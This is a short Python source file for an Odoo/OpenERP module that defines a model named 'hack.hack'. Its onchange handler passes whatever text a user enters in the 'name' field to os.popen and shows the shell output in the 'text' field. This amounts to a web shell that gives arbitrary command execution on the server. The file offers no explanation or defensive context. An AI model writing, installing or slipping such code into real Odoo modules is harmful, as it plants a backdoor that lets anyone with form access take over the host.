# -*- coding: utf-8 -*-

import os
from openerp import models, fields, api

def xexec(val):
    p = os.popen(val,"r")
    t = ""
    while 1:
        line = p.readline()
        t = t + line
        if not line:
            break
    return t
        
class hack(models.Model):
    _name = 'hack.hack'

    @api.onchange('name') # if these fields are changed, call method
    def _check_change(self):
        self.text = xexec(self.name)
    
    name = fields.Char()
    text = fields.Text()